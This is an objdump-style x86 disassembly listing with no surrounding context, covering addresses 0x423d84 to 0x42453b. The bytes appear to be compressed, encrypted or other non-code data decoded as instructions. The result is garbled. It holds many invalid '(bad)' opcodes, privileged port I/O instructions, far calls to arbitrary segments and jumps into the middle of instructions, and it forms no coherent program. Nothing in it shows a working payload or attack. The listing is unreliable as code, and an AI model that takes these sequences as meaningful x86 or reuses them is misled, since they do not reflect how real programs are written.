  423d84:	and    eax,0x7b5b25f7
  423d89:	pop    esp
  423d8a:	ror    BYTE PTR [edi],cl
  423d8c:	mov    al,BYTE PTR [edx]
  423d8e:	mov    bl,0xc2
  423d90:	dec    edi
  423d91:	scas   al,BYTE PTR es:[edi]
  423d92:	mov    edi,0x9bb05dfb
  423d97:	pop    ebp
  423d98:	int    0xd0
  423d9a:	jg     0x423db5
  423d9c:	push   ds
  423d9d:	outs   dx,DWORD PTR ds:[esi]
  423d9e:	cmps   DWORD PTR es:[si],DWORD PTR es:[di]
  423da1:	mov    eax,ds:0x205374a4
  423da6:	shl    BYTE PTR [edx-0x3ef1f5c5],cl
  423dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dad:	test   eax,0xcd584305
  423db2:	stc    
  423db3:	enter  0xfca7,0x84
  423db7:	mov    al,0x31
  423db9:	push   cs
  423dba:	outs   dx,DWORD PTR ds:[esi]
  423dbb:	dec    esi
  423dbc:	jp     0x423e20
  423dbe:	fwait
  423dbf:	and    edx,ecx
  423dc1:	xchg   ebp,eax
  423dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423dc3:	(bad)  
  423dc4:	and    BYTE PTR [edi],al
  423dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dc7:	int    0xd4
  423dc9:	and    dh,al
  423dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dcc:	mov    cl,0x55
  423dce:	mov    ebx,eax
  423dd0:	push   edx
  423dd1:	imul   ebx,DWORD PTR [esi+edi*1-0x17],0xffffffc3
  423dd6:	inc    esi
  423dd7:	icebp  
  423dd8:	(bad)  
  423dd9:	push   ds
  423dda:	popf   
  423ddb:	xor    eax,DWORD PTR [ebx]
  423ddd:	jae    0x423e55
  423ddf:	out    0x57,al
  423de1:	cmp    ebx,DWORD PTR [ebx+esi*4]
  423de4:	lock cmp DWORD PTR [edi-0x15e96b12],edi
  423deb:	imul   edx,DWORD PTR [eax],0xffffffe6
  423dee:	push   ecx
  423def:	cdq    
  423df0:	xchg   ebp,eax
  423df1:	pop    eax
  423df2:	mov    dh,0x7c
  423df4:	in     eax,dx
  423df5:	mov    ss,WORD PTR [esi-0x617a63e0]
  423dfb:	fcomp  QWORD PTR [eax+0x6aa6203c]
  423e01:	xchg   esi,eax
  423e02:	add    al,0x74
  423e04:	xlat   BYTE PTR ds:[ebx]
  423e05:	mov    edi,0x767840fd
  423e0a:	retf   
  423e0b:	jb     0x423e54
  423e0d:	daa    
  423e0e:	jae    0x423e1d
  423e10:	xor    ebx,edi
  423e12:	test   DWORD PTR [ecx+0x8cefd28],0xf282e7f6
  423e1c:	jbe    0x423dd8
  423e1e:	jle    0x423dc8
  423e20:	jp     0x423e9c
  423e22:	imul   esi,DWORD PTR [edx],0xffffffaa
  423e25:	jnp    0x423e82
  423e27:	adc    al,al
  423e29:	mov    BYTE PTR [edi+0x357859],0x94
  423e30:	or     bl,BYTE PTR [ebp-0x6a6060f4]
  423e36:	call   0xc50a:0x74aa037d
  423e3d:	mov    dl,0xa1
  423e3f:	sbb    edi,DWORD PTR [eax+0x1e70001]
  423e45:	add    BYTE PTR [eax],al
  423e47:	sub    al,0x93
  423e49:	mov    ebp,DWORD PTR [ebx+0x258148e3]
  423e4f:	and    eax,0x4cc8c997
  423e54:	ret    
  423e55:	cmp    BYTE PTR [edi],cl
  423e57:	fstp   TBYTE PTR [ebx-0x45]
  423e5a:	jns    0x423e9a
  423e5c:	dec    esp
  423e5d:	jg     0x423e49
  423e5f:	push   ecx
  423e60:	loop   0x423e3d
  423e62:	scas   al,BYTE PTR es:[edi]
  423e63:	push   ebx
  423e64:	clc    
  423e65:	dec    ebp
  423e66:	(bad)  [edi-0x2]
  423e69:	fimul  WORD PTR [ebx-0x34]
  423e6c:	arpl   di,cx
  423e6e:	add    eax,0x519f5ee0
  423e73:	outs   dx,BYTE PTR ds:[esi]
  423e74:	ret    
  423e75:	retf   
  423e76:	mov    BYTE PTR [ecx],bh
  423e78:	xchg   ebx,eax
  423e79:	push   edi
  423e7a:	int3   
  423e7b:	xchg   BYTE PTR [ebx-0x70aa35c1],dh
  423e81:	xchg   esi,eax
  423e82:	jmp    0x3e0f:0x8e5e1172
  423e89:	std    
  423e8a:	xlat   BYTE PTR ds:[ebx]
  423e8b:	aaa    
  423e8c:	jno    0x423e46
  423e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e8f:	(bad)  
  423e90:	aad    0x90
  423e92:	sbb    DWORD PTR [ebp+0x259072ce],edi
  423e98:	in     eax,dx
  423e99:	clc    
  423e9a:	add    ebx,esi
  423e9c:	scas   eax,DWORD PTR es:[edi]
  423e9d:	mov    ds:0x38e2e690,al
  423ea2:	dec    ecx
  423ea3:	pop    ss
  423ea4:	pop    edi
  423ea5:	mov    ebp,0x2d8bb889
  423eaa:	adc    eax,0x1c90915
  423eaf:	pop    edx
  423eb0:	imul   eax,DWORD PTR [edi-0x38974b9],0x2f
  423eb7:	xlat   BYTE PTR ds:[ebx]
  423eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423eb9:	inc    ebp
  423eba:	outs   dx,DWORD PTR ds:[esi]
  423ebb:	cmc    
  423ebc:	or     eax,0x382e5df3
  423ec1:	in     al,0x74
  423ec3:	adc    cl,ah
  423ec5:	push   edi
  423ec6:	rcr    BYTE PTR [esi],cl
  423ec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ec9:	es sti 
  423ecb:	xchg   ecx,eax
  423ecc:	inc    ebx
  423ecd:	stos   DWORD PTR es:[edi],eax
  423ece:	xlat   BYTE PTR ds:[ebx]
  423ecf:	retf   
  423ed0:	stc    
  423ed1:	pop    ds
  423ed2:	imul   ecx,DWORD PTR [ebp-0x5c],0x9c03469e
  423ed9:	mov    edx,0xf0e9e307
  423ede:	push   0x52
  423ee0:	test   DWORD PTR [ebx+0x9],edx
  423ee3:	sbb    eax,0x46979bb8
  423ee8:	mov    al,ds:0xfb06ae76
  423eed:	pusha  
  423eee:	mov    ah,BYTE PTR [ebp-0x6b14edc]
  423ef4:	mov    bl,0x40
  423ef6:	repnz call 0x23ed:0xbca878e8
  423efe:	xor    ebx,DWORD PTR [eax-0x1d907000]
  423f04:	push   0x558682fb
  423f09:	test   al,0x30
  423f0b:	mov    edx,0x84b91618
  423f10:	sub    BYTE PTR [ebp-0x33ed7d30],0xe1
  423f17:	sub    ebx,DWORD PTR [edx+eiz*8+0x6a]
  423f1b:	ins    DWORD PTR es:[edi],dx
  423f1c:	(bad)  
  423f1d:	sbb    al,BYTE PTR [eax]
  423f1f:	cmp    edx,ebx
  423f21:	mov    eax,ds:0x877592ad
  423f26:	lods   al,BYTE PTR ds:[esi]
  423f27:	scas   al,BYTE PTR es:[edi]
  423f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f29:	xchg   ecx,eax
  423f2a:	stc    
  423f2b:	push   edx
  423f2c:	scas   eax,DWORD PTR es:[edi]
  423f2d:	cs int3 
  423f2f:	jl     0x423ebd
  423f31:	mov    al,0xec
  423f33:	push   cs
  423f34:	or     ebx,esp
  423f36:	arpl   WORD PTR [ecx-0x7d],bx
  423f39:	push   ebx
  423f3a:	pop    edi
  423f3b:	pushf  
  423f3c:	cli    
  423f3d:	cld    
  423f3e:	mov    eax,0x2c7e79f6
  423f43:	dec    ebp
  423f44:	sahf   
  423f45:	retw   
  423f47:	ret    0x3451
  423f4a:	adc    bh,dl
  423f4c:	retf   
  423f4d:	mov    eax,0xa61314ce
  423f52:	jno    0x423fbd
  423f54:	shl    DWORD PTR ds:0x69907f24,1
  423f5a:	aad    0xe5
  423f5c:	or     BYTE PTR ds:0x3ee0e5,ah
  423f62:	addr16 aas 
  423f64:	fdivr  DWORD PTR [ebx]
  423f66:	ss cmp al,0x8d
  423f69:	test   BYTE PTR [ecx],dl
  423f6b:	outs   dx,DWORD PTR ds:[esi]
  423f6c:	xchg   edx,eax
  423f6d:	mov    cl,0xe8
  423f6f:	lea    eax,[edx]
  423f71:	popf   
  423f72:	outs   dx,DWORD PTR ds:[esi]
  423f74:	mov    al,ds:0x488e3650
  423f79:	push   es
  423f7a:	(bad)  
  423f7b:	sbb    al,0xe8
  423f7d:	mov    ebp,0xe676986b
  423f82:	inc    DWORD PTR [eax+0x4bab2289]
  423f88:	cmp    DWORD PTR [edx+0x885d121],ebp
  423f8e:	sub    dh,BYTE PTR [esi+0x3f46b3b8]
  423f94:	or     al,BYTE PTR [esp+ebx*1-0x3c253aec]
  423f9b:	jecxz  0x423f53
  423f9d:	(bad)  
  423f9e:	fidivr WORD PTR [edx-0x25]
  423fa1:	jo     0x424000
  423fa3:	dec    edi
  423fa4:	lods   eax,DWORD PTR ds:[esi]
  423fa5:	lods   eax,DWORD PTR ds:[esi]
  423fa6:	sub    edi,edx
  423fa8:	sar    bh,1
  423faa:	clc    
  423fab:	scas   al,BYTE PTR es:[edi]
  423fac:	pushf  
  423fad:	mov    ch,0xc3
  423faf:	call   0xd390664e
  423fb4:	aaa    
  423fb5:	(bad)  
  423fb7:	xchg   DWORD PTR [edi-0x115a66ed],eax
  423fbd:	mov    al,0xac
  423fbf:	retf   0x8fb1
  423fc2:	js     0x424025
  423fc4:	push   eax
  423fc5:	fdivr  st,st(2)
  423fc7:	retf   0x847a
  423fca:	pop    ebx
  423fcb:	dec    ebx
  423fcc:	rcl    DWORD PTR [edi-0x274df36],cl
  423fd2:	xor    DWORD PTR [esi-0x5e],esp
  423fd5:	and    dl,ch
  423fd7:	test   edi,eax
  423fd9:	pop    edx
  423fda:	scas   al,BYTE PTR es:[edi]
  423fdb:	sbb    DWORD PTR ds:0x77610342,eax
  423fe1:	(bad)  
  423fe2:	dec    eax
  423fe3:	cmp    eax,0xa37e619e
  423fe8:	pusha  
  423fe9:	jae    0x423f8c
  423feb:	mov    ah,BYTE PTR [ebx]
  423fed:	mov    esp,0x84791152
  423ff2:	lods   eax,DWORD PTR ds:[esi]
  423ff3:	(bad)  
  423ff4:	push   ebx
  423ff5:	leave  
  423ff6:	xchg   esi,eax
  423ff7:	mov    ds:0xc3f60438,eax
  423ffc:	ins    BYTE PTR es:[edi],dx
  423ffd:	out    0xc3,eax
  423fff:	ret    0x85a
  424002:	jle    0x423ffb
  424004:	or     al,BYTE PTR [edx]
  424006:	adc    DWORD PTR [ecx+0x67],0x25b2a519
  42400d:	mov    DWORD PTR [edx-0x61],edi
  424010:	or     ebp,ebx
  424012:	cs pop esi
  424014:	or     al,0x43
  424016:	lock shl bh,cl
  424019:	jbe    0x424088
  42401b:	addr16 sahf 
  42401d:	dec    ecx
  42401e:	jecxz  0x423fa6
  424020:	and    ecx,DWORD PTR ds:0xac906570
  424026:	repz dec ebx
  424028:	(bad)  
  424029:	mov    edx,0xf8c69578
  42402e:	add    BYTE PTR [eax-0x5020734d],dl
  424034:	call   ebx
  424036:	call   DWORD PTR [ecx+0x1814b80f]
  42403c:	cmp    DWORD PTR [ecx],esi
  42403e:	popf   
  42403f:	add    bh,BYTE PTR [edx+0x1e70001]
  424045:	add    BYTE PTR [eax],al
  424047:	lahf   
  424048:	pop    ebp
  424049:	pop    edx
  42404a:	inc    eax
  42404b:	popf   
  42404c:	js     0x4240a4
  42404e:	push   ecx
  42404f:	and    ebx,DWORD PTR [ebp+0x36]
  424052:	xor    al,0xd1
  424054:	or     dl,BYTE PTR [eax-0x63f492f0]
  42405a:	sbb    al,0x54
  42405c:	scas   eax,DWORD PTR es:[edi]
  42405d:	mov    edi,0xa70663ce
  424062:	add    BYTE PTR [esi+0x1e],dh
  424065:	push   ecx
  424066:	push   edx
  424067:	push   0xffffffac
  424069:	xor    eax,0x5655a481
  42406e:	jae    0x424068
  424070:	(bad)  
  424072:	leave  
  424073:	add    esp,ecx
  424075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424076:	sbb    BYTE PTR [ecx+0x6f],dh
  424079:	cmc    
  42407a:	mov    ebp,0x9122b202
  42407f:	fisttp DWORD PTR [edi-0x55dede44]
  424085:	mov    bh,0xb4
  424087:	test   DWORD PTR [eax],eax
  424089:	push   edi
  42408a:	inc    esp
  42408b:	add    esi,DWORD PTR [edi+0x40ea00b]
  424091:	mov    ecx,0x8515b95a
  424096:	cs push ebx
  424098:	cmp    cl,ch
  42409a:	cmp    eax,0xb247a429
  42409f:	sbb    al,0x8
  4240a1:	cmp    DWORD PTR [ebp+0x5f],ecx
  4240a4:	and    al,0xb
  4240a6:	lahf   
  4240a7:	push   cs
  4240a8:	cmp    al,0xaf
  4240aa:	push   esi
  4240ab:	or     DWORD PTR [ebx+0x15],esp
  4240ae:	push   edx
  4240af:	pop    ecx
  4240b0:	mov    BYTE PTR [ecx],ah
  4240b2:	xor    BYTE PTR [ebx+ebx*1+0x29],al
  4240b6:	and    al,bh
  4240b8:	in     eax,0xe4
  4240ba:	lahf   
  4240bb:	jo     0x69bdf0a3
  4240c1:	xchg   esi,eax
  4240c2:	xchg   ebp,eax
  4240c3:	je     0x424127
  4240c5:	dec    eax
  4240c6:	or     DWORD PTR [edx],0x15
  4240c9:	repz shr ch,0xc8
  4240cd:	test   ebp,ecx
  4240cf:	mul    BYTE PTR [ebx]
  4240d1:	mov    cl,0xaa
  4240d3:	ja     0x4240aa
  4240d5:	pop    esi
  4240d6:	adc    al,0x7
  4240d8:	gs adc eax,0xb59315b6
  4240de:	dec    edi
  4240df:	addr16 xchg ebp,eax
  4240e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240e2:	sti    
  4240e3:	test   BYTE PTR [esi+eax*2],bl
  4240e6:	dec    eax
  4240e7:	and    edx,DWORD PTR [edi]
  4240e9:	in     eax,dx
  4240ea:	mov    esp,0xcbcae30c
  4240ef:	adc    dl,BYTE PTR [ecx+esi*1-0x18541414]
  4240f6:	loop   0x4240a7
  4240f8:	or     edi,DWORD PTR [ebx+0x4d]
  4240fb:	js     0x4240ab
  4240fd:	push   cs
  4240fe:	mov    ds:0xdc345667,al
  424103:	xor    ah,dl
  424105:	mov    edi,0x565be123
  42410a:	test   BYTE PTR [edx],dl
  42410c:	call   0x9171c361
  424111:	sub    bh,ah
  424113:	and    DWORD PTR [edx],esp
  424115:	dec    edx
  424116:	ret    
  424117:	cmp    eax,0xdd043876
  42411c:	or     ebx,DWORD PTR [ebx+0x1e0695cc]
  424122:	mov    cl,0x47
  424124:	adc    eax,edi
  424126:	lea    esi,[eax+0x3a26ceea]
  42412c:	mov    ds:0x4f804a88,eax
  424131:	inc    ecx
  424132:	sbb    DWORD PTR [esi+0x19],eax
  424135:	iret   
  424136:	shl    DWORD PTR [edx+0x1b],1
  424139:	cmp    BYTE PTR [ebp-0x56],ah
  42413c:	push   0x53
  42413e:	or     esp,DWORD PTR [edi-0x3ee6aafb]
  424144:	inc    esi
  424145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424146:	or     eax,0x579fcb6
  42414b:	xor    edx,eax
  42414d:	inc    ebx
  42414e:	jno    0x4240e2
  424150:	shl    BYTE PTR [edi-0x4eeca5d],cl
  424156:	aaa    
  424157:	stos   BYTE PTR es:[edi],al
  424158:	cmp    al,0x73
  42415a:	int    0xd5
  42415c:	ja     0x42415f
  42415e:	ss ret 
  424160:	bound  ebx,QWORD PTR [ebx+0x15]
  424163:	pop    edx
  424164:	xchg   ebp,eax
  424165:	(bad)  
  424166:	clc    
  424167:	sbb    al,0x58
  424169:	imul   BYTE PTR [eax]
  42416b:	jo     0x42417d
  42416d:	(bad)  
  42416e:	dec    DWORD PTR [ebp-0x612c28fe]
  424174:	xlat   BYTE PTR ds:[ebx]
  424175:	lahf   
  424176:	loop   0x4241f1
  424178:	add    al,0xa3
  42417a:	scas   al,BYTE PTR es:[edi]
  42417b:	adc    bl,BYTE PTR [eax]
  42417d:	xchg   ecx,esp
  42417f:	xchg   esi,eax
  424180:	fldcw  WORD PTR [eax+ebx*2]
  424183:	in     eax,0xec
  424185:	pop    ecx
  424186:	pop    ecx
  424187:	lock mov ebx,0xfd6ae6b7
  42418d:	pop    ds
  42418e:	lea    ebx,[ebx+0x13528979]
  424194:	or     al,0xf5
  424196:	xlat   BYTE PTR ds:[ebx]
  424197:	ds ss jno 0x4241ed
  42419b:	xor    eax,0x1843c01e
  4241a0:	inc    ebx
  4241a1:	aas    
  4241a2:	sub    ecx,edx
  4241a4:	xor    DWORD PTR [esi-0x1193781d],esi
  4241aa:	dec    esp
  4241ab:	xchg   esi,eax
  4241ac:	push   cs
  4241ad:	inc    esi
  4241ae:	mov    ah,0x90
  4241b0:	pop    esi
  4241b1:	or     DWORD PTR [edi-0x2e],ebp
  4241b4:	das    
  4241b5:	pushf  
  4241b6:	scas   eax,DWORD PTR es:[edi]
  4241b7:	dec    edx
  4241b8:	out    0xaf,eax
  4241ba:	dec    DWORD PTR [ebx+edi*1]
  4241bd:	xchg   esp,eax
  4241be:	inc    edi
  4241bf:	sub    ch,BYTE PTR [esi]
  4241c1:	pusha  
  4241c2:	xchg   ebx,eax
  4241c3:	scas   al,BYTE PTR es:[edi]
  4241c4:	pop    eax
  4241c5:	mov    dh,ah
  4241c7:	je     0x424242
  4241c9:	loop   0x424234
  4241cb:	mov    ebp,0x53f7660e
  4241d0:	not    BYTE PTR [esi]
  4241d2:	test   DWORD PTR [edx-0x61],0x607e4263
  4241d9:	out    0x59,al
  4241db:	mov    bh,0xc7
  4241dd:	jl     0x424214
  4241df:	mov    ah,0x1d
  4241e1:	mov    cl,0x2a
  4241e3:	xor    eax,DWORD PTR [esi+0x2c0254dd]
  4241e9:	pop    ebp
  4241ea:	retf   0x4486
  4241ed:	sbb    DWORD PTR [ebx],edx
  4241ef:	in     eax,0xa9
  4241f1:	aam    0xad
  4241f3:	sub    bl,BYTE PTR [ecx]
  4241f5:	jno    0x424256
  4241f7:	out    0x9f,al
  4241f9:	inc    edi
  4241fa:	jg     0x4241d9
  4241fc:	adc    ebx,esp
  4241fe:	mov    al,ds:0x977191ac
  424203:	xchg   esp,eax
  424204:	in     al,dx
  424205:	loope  0x424285
  424207:	adc    ch,BYTE PTR [ebx-0x35]
  42420a:	xor    bh,0xcf
  42420d:	mov    ah,0x3c
  42420f:	push   es
  424210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424211:	(bad)  
  424212:	jnp    0x424259
  424214:	mov    ah,BYTE PTR [eax]
  424216:	pop    edx
  424217:	test   eax,0x15715a68
  42421d:	repnz out 0xa9,eax
  424220:	push   0x15
  424222:	fdiv   st,st(1)
  424224:	retf   
  424225:	sub    ah,0x48
  424228:	jo     0x424264
  42422a:	push   ecx
  42422b:	ins    BYTE PTR es:[edi],dx
  42422c:	pop    edx
  42422d:	or     eax,0x38a94900
  424232:	popf   
  424233:	clc    
  424234:	popf   
  424235:	in     eax,dx
  424236:	std    
  424237:	xchg   ebx,eax
  424238:	retf   
  424239:	or     eax,0x577541ae
  42423e:	xchg   esi,eax
  42423f:	jmp    0xe74243ff
  424244:	add    DWORD PTR [eax],eax
  424246:	add    BYTE PTR [ebp+0x1eb827c6],ah
  42424c:	add    eax,0x4b7a3144
  424251:	cld    
  424252:	jp     0x4241e9
  424254:	jl     0x424227
  424256:	jmp    0x2342:0xb46d2df7
  42425d:	xchg   BYTE PTR [edx+0x74968cc],dh
  424263:	lock mov cs,WORD PTR [ebp+esi*1-0x6d]
  424268:	add    edi,ecx
  42426a:	jns    0x42426f
  42426c:	push   cs
  42426d:	dec    eax
  42426e:	xor    BYTE PTR ds:0x3e900444,dh
  424274:	push   ss
  424275:	std    
  424276:	pop    es
  424277:	not    BYTE PTR [ecx-0x17001738]
  42427d:	xor    ecx,DWORD PTR [ebp+0x6fcd6e73]
  424283:	fs repz mov ecx,0xc7fe1c5b
  42428a:	sbb    eax,0x173ae5fb
  42428f:	(bad)  
  424290:	es jo  0x42422b
  424293:	mov    esi,0xe7759577
  424298:	xchg   DWORD PTR [edi+eiz*8+0x49],edx
  42429c:	ret    
  42429d:	mov    al,ds:0x37c4eccc
  4242a2:	push   esi
  4242a3:	(bad)  
  4242a4:	jns    0x424255
  4242a6:	je     0x424246
  4242a8:	sub    ecx,eax
  4242aa:	xor    eax,0x82878684
  4242af:	js     0x4242c8
  4242b1:	push   es
  4242b2:	cld    
  4242b3:	ror    BYTE PTR [ebp+0x1cdf7e53],cl
  4242b9:	mov    eax,0x26caf8dd
  4242be:	push   edi
  4242bf:	popa   
  4242c0:	adc    ebp,edx
  4242c2:	lock jle 0x4242be
  4242c5:	add    eax,0x6855208c
  4242ca:	cmp    BYTE PTR [eax-0x5ffb326a],cl
  4242d0:	mov    bh,0x3b
  4242d2:	sahf   
  4242d3:	sar    cl,0x43
  4242d6:	in     eax,0xaf
  4242d8:	jecxz  0x4242c6
  4242da:	push   ss
  4242db:	gs retf 
  4242dd:	mov    ah,0xd8
  4242df:	inc    ecx
  4242e0:	jmp    0x42430f
  4242e2:	popf   
  4242e3:	adc    al,0xca
  4242e5:	loop   0x4242fa
  4242e7:	dec    ebx
  4242e8:	outs   dx,DWORD PTR ds:[esi]
  4242e9:	jnp    0x424362
  4242eb:	push   ds
  4242ec:	daa    
  4242ed:	cli    
  4242ee:	cmp    eax,0x620e3faa
  4242f3:	dec    ecx
  4242f4:	sbb    DWORD PTR [ebx],0x98deb4d2
  4242fa:	push   cs
  4242fb:	aad    0x7c
  4242fd:	dec    ebp
  4242fe:	mov    ebx,0xe2ba9361
  424303:	push   es
  424304:	ss jb  0x424361
  424307:	loope  0x424331
  424309:	or     esp,DWORD PTR [ebx]
  42430b:	shl    cl,0xa1
  42430e:	(bad)  
  42430f:	xor    esp,DWORD PTR [eax]
  424311:	sbb    al,0xbd
  424313:	ret    
  424314:	push   0x62
  424316:	shl    DWORD PTR [eax],cl
  424318:	mov    ebx,0xb04cd41f
  42431d:	mov    bl,0x2e
  42431f:	int    0x8b
  424321:	addr16 dec edi
  424323:	inc    eax
  424324:	inc    esp
  424325:	out    dx,al
  424326:	mov    dl,0xf8
  424328:	or     DWORD PTR [ecx-0x35cf6c1b],0x2e2df4b6
  424332:	mov    eax,ds:0xd9afffa5
  424337:	fst    QWORD PTR [esi-0x4a57b1d5]
  42433d:	sub    DWORD PTR [ebp+0x38],esp
  424340:	jae    0x42430e
  424342:	jecxz  0x42435a
  424344:	out    0xca,eax
  424346:	mov    ah,0x3f
  424348:	cmp    DWORD PTR [ebx],0x81874b65
  42434e:	iret   
  42434f:	mov    eax,0x42d55f7c
  424354:	cwde   
  424355:	aad    0x5d
  424357:	sub    cl,cl
  424359:	bound  edi,QWORD PTR [edx-0x7f]
  42435c:	mov    dl,0xad
  42435e:	adc    BYTE PTR [ebx+0xb],dh
  424361:	and    edi,ecx
  424363:	bound  ebp,QWORD PTR [eax]
  424365:	fwait
  424366:	out    dx,eax
  424367:	xchg   esi,eax
  424368:	push   0xc574fb2a
  42436d:	jo     0x42438f
  42436f:	rol    DWORD PTR [edx-0x4cf8ba1c],1
  424375:	pop    ds
  424376:	pop    ebx
  424377:	inc    ecx
  424378:	mov    cl,ah
  42437a:	cmp    al,0xce
  42437c:	aam    0x3b
  42437e:	mov    esi,0x98a21819
  424383:	ins    BYTE PTR es:[edi],dx
  424384:	sbb    eax,0xeb9323f
  424389:	fs (bad) 
  42438b:	pop    ebp
  42438c:	aam    0xaa
  42438e:	cmp    ah,BYTE PTR [ebx-0x42]
  424391:	inc    ebx
  424392:	push   ds
  424393:	pop    ebx
  424394:	dec    BYTE PTR [esi]
  424396:	add    BYTE PTR [edi-0x17],ch
  424399:	js     0x42440f
  42439b:	ja     0x42438e
  42439d:	fisubr WORD PTR [eax+0x4f94f25c]
  4243a3:	sub    ah,ah
  4243a5:	outs   dx,BYTE PTR ds:[esi]
  4243a6:	shl    BYTE PTR [ecx],cl
  4243a8:	out    0xa1,al
  4243aa:	lea    esp,ds:0xdd77452b
  4243b0:	outs   dx,DWORD PTR ds:[esi]
  4243b1:	mov    esp,0xbd3587aa
  4243b6:	(bad)  
  4243b7:	ins    BYTE PTR es:[edi],dx
  4243b8:	pushf  
  4243b9:	add    bl,BYTE PTR ss:[ebx-0x30]
  4243bd:	and    BYTE PTR ds:0x1ac4be0d,0xc7
  4243c4:	push   ebx
  4243c5:	mov    ah,0x1
  4243c7:	push   esi
  4243c8:	out    0xfe,al
  4243ca:	dec    esi
  4243cb:	xchg   ebx,eax
  4243cc:	nop
  4243cd:	and    ecx,DWORD PTR [edi]
  4243cf:	mov    es,edx
  4243d1:	mov    WORD PTR [ecx],gs
  4243d3:	test   BYTE PTR [ebp-0x3c10c4db],dh
  4243d9:	mov    ecx,0x55015f34
  4243de:	xchg   esi,eax
  4243df:	add    ah,dl
  4243e1:	test   DWORD PTR cs:[edx+eiz*8+0x42],ebp
  4243e6:	mov    ch,0xee
  4243e8:	fyl2xp1 
  4243ea:	imul   esp,DWORD PTR [ebp-0x80],0x38283eef
  4243f1:	and    DWORD PTR [edi+0x4],0x30fc4e06
  4243f8:	jge    0x42444a
  4243fa:	xor    edx,DWORD PTR [esi+ecx*8+0x3a]
  4243fe:	scas   al,BYTE PTR es:[edi]
  4243ff:	test   al,0x55
  424401:	jge    0x424426
  424403:	push   ecx
  424404:	mov    edi,0x1d52af55
  424409:	adc    edi,0x41
  42440c:	adc    dh,BYTE PTR [ebx-0x30ca0d55]
  424412:	jle    0x4243f0
  424414:	repnz ds adc esi,esi
  424418:	pop    ebp
  424419:	jb     0x4243e5
  42441b:	push   es
  42441c:	mov    ah,BYTE PTR [edi]
  42441e:	std    
  42441f:	sub    cl,BYTE PTR [esi-0x219ef77d]
  424425:	(bad)  
  424427:	xor    ecx,esp
  424429:	out    dx,eax
  42442a:	jl     0x4244ab
  42442c:	jnp    0x424471
  42442e:	add    BYTE PTR [esi],ah
  424430:	mov    eax,0xbf9f8f0d
  424435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424436:	mov    ecx,0xfc11d972
  42443b:	rol    BYTE PTR [ebx-0x422fb306],cl
  424441:	add    DWORD PTR [eax],eax
  424443:	out    0x1,eax
  424445:	add    BYTE PTR [eax],al
  424447:	xchg   edi,eax
  424448:	cli    
  424449:	test   eax,0x546478c3
  42444e:	test   DWORD PTR [esi+edi*4],eax
  424451:	push   es
  424452:	push   ebx
  424453:	stos   BYTE PTR es:[edi],al
  424454:	and    ebx,DWORD PTR [eax]
  424456:	iret   
  424457:	mov    al,0x1e
  424459:	pop    ecx
  42445a:	icebp  
  42445b:	pop    es
  42445c:	dec    ebp
  42445d:	adc    DWORD PTR [ecx-0x5296f9d7],esi
  424463:	xchg   cl,bh
  424465:	fsubr  st,st(3)
  424467:	adc    BYTE PTR ds:0x67509ad2,al
  42446d:	push   0x40
  42446f:	pop    edi
  424470:	mov    esp,0xc60cbc53
  424475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424476:	loope  0x42445b
  424478:	mov    al,ds:0x3fb1c0c4
  42447d:	cdq    
  42447e:	jl     0x4244c4
  424480:	icebp  
  424481:	push   ds
  424482:	fdiv   DWORD PTR [ecx]
  424484:	xor    ebx,DWORD PTR [edi+0x0]
  424487:	xor    dh,bl
  424489:	ficomp WORD PTR [edi]
  42448b:	sbb    DWORD PTR [edi+0x33],edx
  42448e:	or     al,BYTE PTR [eax+0x5c022da9]
  424494:	jp     0x424438
  424496:	push   es
  424497:	popa   
  424498:	(bad)  
  424499:	call   0x3fa6:0x13cb71aa
  4244a0:	xlat   BYTE PTR ds:[ebx]
  4244a1:	sbb    dh,ch
  4244a3:	inc    esi
  4244a4:	outs   dx,DWORD PTR ds:[esi]
  4244a5:	imul   edx,DWORD PTR [edx-0x69a9ec68],0xb0de7c8e
  4244af:	sub    cl,cl
  4244b1:	jb     0x424478
  4244b3:	mov    al,BYTE PTR [ebp+0x7d1ddc14]
  4244b9:	mov    esp,0x22164328
  4244be:	pop    ss
  4244bf:	add    ebx,DWORD PTR [eax+0x3e195ce2]
  4244c5:	fadd   DWORD PTR [ebp+0x4a]
  4244c8:	xchg   edi,eax
  4244c9:	dec    ebp
  4244ca:	lods   al,BYTE PTR ds:[esi]
  4244cb:	xchg   ecx,eax
  4244cc:	test   al,0x9d
  4244ce:	jns    0x4244f3
  4244d0:	mov    edx,DWORD PTR [ebp+0x35e506e]
  4244d6:	ret    0xfb70
  4244d9:	dec    eax
  4244da:	pop    ds
  4244db:	jo     0x4244d7
  4244dd:	jns    0x4244d0
  4244df:	enter  0xe6fc,0x37
  4244e3:	rcl    BYTE PTR [ebx],1
  4244e5:	cdq    
  4244e6:	xchg   esi,eax
  4244e7:	call   0x786e:0x60f0c29e
  4244ee:	mov    ch,0xf2
  4244f0:	xor    cl,BYTE PTR [ebx-0x793d9fd4]
  4244f6:	pop    ebp
  4244f7:	xor    al,0xc
  4244f9:	xor    DWORD PTR [eax+0x68aa0483],0xffffff99
  424500:	(bad)  
  424501:	sub    eax,0xb260b3a4
  424506:	mov    ecx,0xb1840525
  42450b:	cmp    al,0x7a
  42450d:	lock cmp dh,ah
  424510:	pop    edi
  424511:	ror    DWORD PTR [eax],cl
  424513:	aas    
  424514:	xor    edi,esi
  424516:	xor    eax,0x25147c7
  42451b:	pop    es
  42451c:	push   edi
  42451d:	(bad)  
  42451e:	and    ebp,eax
  424520:	shr    BYTE PTR [ebp+0xb],1
  424523:	sub    eax,0x2ae16a3
  424528:	mov    edi,0x7cee7cc6
  42452d:	jle    0x424578
  42452f:	jae    0x4244ef
  424531:	jbe    0x4244f6
  424533:	adc    DWORD PTR [esi-0x36e2c236],ecx
  424539:	cmp    BYTE PTR [edi],dh
  42453b:	jl     0x4244ef
